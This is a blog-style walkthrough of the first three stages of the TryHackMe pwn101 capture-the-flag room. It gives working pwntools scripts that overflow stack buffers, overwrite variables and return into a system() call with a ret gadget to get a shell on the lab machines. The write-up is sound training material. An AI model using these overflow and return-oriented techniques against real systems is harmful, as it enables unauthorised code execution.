In this post, we'll be discussing the TryHackMe room known as pwn101. This challenge will test and improve your buffer overflow and ROP chaining skills. By completing this challenge, you will gain valuable experience in identifying vulnerabilities, exploiting them, and ultimately gaining access to a target system. Whether you're a newbie or a skilled hacker, pwn101 is an excellent way to sharpen your skills and gain more knowledge in the field of cybersecurity. Let's explore the specifics of this exciting challenge to discover what it entails.

## pwn101.pwn101

Pwn101 is a series of ten stages that increase in difficulty. However, the first stage, pwn101.pwn101, is relatively easy. As shown in the screenshot below, you only need to provide a long enough string to cause a buffer overflow and modify the integer variable following the buffer:

![pwn101's main() function](pwn101-main.png)

 So, without further ado, here is a pwntools script to accomplish this:

```python
from pwn import * 

context.log_level = 'debug'

elf = context.binary = ELF("./pwn101.pwn101")

gs = '''
break main
'''
def start():
    if args.TMUX:
        context.terminal = ["tmux", "splitw", "-h"]

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("10.10.100.183", 9001)
    else:
        return process(elf.path)

io = start()
io.recvuntil(b'make briyani:')
io.sendline(b"A" * 70)
io.interactive()
```

We are using multiple "A" letters to create our payload. This payload will modify the value of a variable from `0x00000539`  (which is equivalent to `1337` in decimal) to `0x41414141` (represented by the letters "A" in hexadecimal). After running the script, we've got the shell:

![pwn101 shell](pwn101-shell.png)

## pwn102.pwn102

Our goal in the second challenge is to change the values of two variables located after the buffer. These variables are labelled `variable_1` and `variable_2` in the screenshot. We need to set them to `0x00c0ff33` and `0x0000c0d3`to get the shell:

![pwn102's main() function](pwn102-main.png)

To achieve our goal, we must pass a string of sufficient length that overwrites the buffer and variables with "coffee" and "code" values. Remember to consider endianness:

```python
from pwn import * 

context.log_level = 'debug'

elf = context.binary = ELF("./pwn102.pwn102")

gs = '''
break main
'''
def start():
    if args.TMUX:
        context.terminal = ["tmux", "splitw", "-h"]

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("10.10.100.183", 9002)
    else:
        return process(elf.path)

io = start()
io.recvuntil(b'right?')

payload  = b"A" * 104
payload += p32(0x0000c0d3, endian='little')
payload += p32(0x00c0ff33, endian='little')

io.sendline(payload)

io.interactive()
```

Once our payload is ready, we can send it to the server:

![pwn102 shell](pwn102-shell.png)

And again, we've got a shell.

## pwn103.pwn103

The third challenge, pwn103, involves a more complex set of tasks to solve than the previous challenges, but it is still relatively easy. After opening the binary file in Ghidra, you can see that it contains a "switch-case" with multiple functions. It looks like a simple chat application:

![pwn103 main() function](pwn103-main.png)

Let's check what functionality it has. The `announcements()` function prints a few messages and calls `main()`, the same as the `discussion()` and `rules()`. Also, the `bot_cmd()` reads the input and displays a few fake commands.

![pwn103 general() function](pwn103-general.png)

The most interesting for us will be the `general()` function which, despite displaying few messages, also reads the input from the user via `scanf()` without proper checks. But there is one more thing. After examining the symbol tree thoroughly, we have discovered a function named `admins_only()`, which includes a call to the `system()`. By exploiting this and the bug in the `general()` function, remote code execution is possible.

![pwn103 admins_only() function](pwn103-admins_only.png)

Let's write a pwntools script for that:

```jsx
from pwn import * 

context.log_level = 'debug'

elf = context.binary = ELF("./pwn103.pwn103")

gs = '''
break main
'''
def start():
    if args.TMUX:
        context.terminal = ["tmux", "splitw", "-h"]

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("10.10.57.182", 9003)
    else:
        return process(elf.path)

io = start()
io.recvuntil(b'channel:')
io.sendline(b'3')
io.recvuntil(b'pwner]:')

payload  = b"A" * 40
payload += p64(elf.symbols.admins_only)

io.sendline(payload)
io.interactive()
```

We can run the script against the remote machine when it is ready. Let's run it. 

![pwn103 shell](pwn103-shell.png)

The script started but crashed after sending a command to the spawned shell. After looking in GDB, we see that our stack needs to be aligned. So we need to pop one item from the stack. The easiest way is to find a `ret` gadget and use it. We can use the `ROPgadget` tool for that:

![pwn103 ROPgadget tool](pwn103-ropgadget.png)

It found the "ret" instruction at the `0x00401016` address. Let's use it:

```jsx
payload  = b"A" * 40
payload += p64(0x00401016)              # ret, to make stack properly aligned
payload += p64(elf.symbols.admins_only)
```

And here is the result, we've got the shell again.

Great job, we've successfully finished this section! Join me in the next part, where we'll tackle the rest of the challenges from this room together.
